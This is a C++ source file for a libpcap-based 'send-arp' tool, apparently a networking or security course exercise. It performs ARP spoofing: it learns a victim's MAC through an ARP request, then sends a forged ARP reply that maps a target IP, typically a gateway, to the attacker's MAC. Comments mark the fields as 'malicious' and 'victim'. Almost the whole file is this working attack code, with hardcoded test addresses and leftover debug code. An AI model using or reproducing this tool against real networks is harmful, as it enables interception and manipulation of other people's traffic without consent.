#include <cstdio>
#include <pcap.h>
/* GO */
#include <iostream>
#include <cstring>
#include <string>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <iomanip>

/* GO */
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
using namespace std;

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)



void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

uint32_t c_to_u32_ip(const char* t_ip){
    uint32_t rt_ip=0;
    uint8_t  tmp=0;


    for(int i=0;i<strlen(t_ip);i++){
        if(t_ip[i]=='.'){
            rt_ip|=tmp;
            rt_ip  = rt_ip<<8;
            tmp=0;
        }
        else if(i==strlen(t_ip)-1){ //final
            tmp*=10;
            tmp+=t_ip[i]-'0';
            rt_ip|=tmp;
        }
        else{
            tmp*=10;
            tmp+=t_ip[i]-'0';
        }
    }
    return rt_ip;
}

EthArpPacket m_rq_packet(Mac me_mac, Ip m_ip, Ip v_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // broadcast
    //packet.eth_.smac_ = me_mac; // me
    packet.eth_.smac_ = Mac("90:DE:80:9D:47:3F"); // me test
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;

    packet.arp_.op_ = htons(ArpHdr::Request);
    //packet.arp_.smac_ = me_mac; //me - malicious
    packet.arp_.smac_ = Mac("90:DE:80:9D:47:3F"); //me - malicious
    //packet.arp_.sip_ = m_ip;     //my ip
    packet.arp_.sip_ = Ip("16.3.3.10");
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //unknown
    packet.arp_.tip_ = htonl(v_ip);  //victim ip

    return packet;
}

bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac ){

    const u_char *cpacket = packet;

    EthHdr *ethHdr = (EthHdr*) cpacket;
    cpacket += sizeof(EthHdr);
    ArpHdr *arpHdr = (ArpHdr*) cpacket;

    //1. is Arp?
    if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
    printf("type: %x\n", ethHdr->Arp); //debug

    //2. is s_ip == cs_ip ?
    Ip cs_ip = arpHdr->sip();
    printf("cs_ip: %x, s_ip: %x\n", cs_ip, s_ip); //debug

    if(cs_ip!=s_ip) return false;

    //3. is m_ip == cm_ip ?
    Ip cm_ip = arpHdr->tip();
    printf("cm_ip: %x, m_ip: %x\n", cm_ip, m_ip);
    if(cm_ip!=m_ip) return false;

    //4. is me_mac == cme_mac ?
    Mac cme_mac = arpHdr->tmac();
    printf("cme_mac: %x, me_mac: %x\n", cme_mac, me_mac);
    if(cme_mac!=me_mac) return false;

    return true;

}

Mac get_s_mac(const u_char* packet){

    Mac s_mac;
    const u_char *cpacket = packet;
    cpacket += sizeof(EthHdr);
    ArpHdr *arpHdr = (ArpHdr*) cpacket;

    s_mac = arpHdr->smac();

    /*debug*/
    const uint8_t* mac = reinterpret_cast<const uint8_t*>(&s_mac);
    printf("s_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return s_mac;

}


// string get_me_ip(const string& interface) {
//     int fd = socket(AF_INET, SOCK_DGRAM, 0);
//     if (fd == -1) {
//         perror("socket");
//         return "";
//     }

//     struct ifreq ifr;
//     memset(&ifr, 0, sizeof(ifr));
//     strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

//     if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
//         perror("ioctl");
//         close(fd);
//         return "";
//     }

//     close(fd);

//     struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
//     return string(inet_ntoa(ipaddr->sin_addr));
// }

uint32_t get_me_ip(const std::string& interface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("socket");
        return 0;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(fd);
        return 0;
    }

    close(fd);

    struct sockaddr_in* ipaddr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
    // s_addr는 네트워크 바이트 순서라서 ntohl로 호스트 순서로 변환
    return ntohl(ipaddr->sin_addr.s_addr);
}

bool get_me_mac(const std::string& interface, uint8_t mac[6]) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sock);
        return false;
    }

    close(sock);

    std::memcpy(mac, reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data), 6);
    return true;
}

/*std::string get_me_mac(const std::string& interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return "";
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sock);
        return "";
    }

    close(sock);

    unsigned char* mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);
    std::ostringstream oss;
    oss << std::uppercase << std::hex << std::setfill('0');
    for (int i = 5; i >= 0; --i) {
        oss << std::setw(2) << static_cast<int>(mac[i]);
        if (i != 0)
            oss << ':';
    }
    return oss.str(); // 예: "3F:47:9D:80:DE:90"
}*/


EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = v_mac; // you - send
    //packet.eth_.smac_ = me_mac; // me
    packet.eth_.smac_ = Mac("90:DE:80:9D:47:3F"); // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;

    packet.arp_.op_ = htons(ArpHdr::Reply);
    //packet.arp_.smac_ = me_mac; //me - malicious
    packet.arp_.smac_ = Mac("90:DE:80:9D:47:3F");
    packet.arp_.sip_ = t_ip;     //target ip
    packet.arp_.tmac_ = v_mac; //you - victim mac
    packet.arp_.tip_ = v_ip;  //you - victim ip

    return packet;

}

int main(int argc, char* argv[]) {

    if (argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

    int repeat_time = argc/2 - 1;
    for(int re=0; re<repeat_time; re++){

        char* dev = argv[1];

        //1. packet capture start
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
        if (pcap == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return EXIT_FAILURE;
        }

        //2. make request packet
        uint8_t me_mac_ar[6];
        get_me_mac(dev,me_mac_ar);

        printf("me_mac_ar:");
        for(int i=0;i<6;i++) printf("%0x", me_mac_ar[i]);
        printf("\n");

        Mac me_mac = Mac(me_mac_ar); // i dont know is it right

        printf("%02X", get_me_ip(dev));
        Ip me_ip = Ip(get_me_ip(dev));

        Ip v_ip = Ip(c_to_u32_ip(argv[re*2+2]));



        printf("me mac: %02x, me_ip: %02x, v_ip: %02x\n", me_mac, me_ip,v_ip); //debug

        EthArpPacket r_packet = m_rq_packet(me_mac, me_ip, v_ip);


        //send the request_packet
        int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&r_packet), sizeof(EthArpPacket));
        if (res1 != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(pcap));

        printf("send packet\n"); //debug


        while (true){
                struct pcap_pkthdr* header;
                const u_char* packet;
                int res = pcap_next_ex(pcap, &header, &packet);
                if (res == 0) continue;
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                    printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                    break;
                }
            printf("%u bytes captured\n", header->caplen); // GO : debug



            //3. is_Sreply
            if(!isSreply(packet, v_ip, me_ip, me_mac ))continue;

            printf("reply captured\n"); //debug

            //4. get Smac (victim mac)
            Mac s_mac = get_s_mac(packet);

            //5. make attack packet
            Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3])); //fucking here you need to check

            /* debug */
            const uint32_t* tt_ip = reinterpret_cast<const uint32_t*>(&t_ip);
            printf("tt_ip: %u\n", *tt_ip);

            Ip ttt_ip = Ip(htonl(*tt_ip));


            EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, v_ip);

            //6. send the attack_packet
            int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
            }


            pcap_close(pcap);
            break;
        }
    }
}
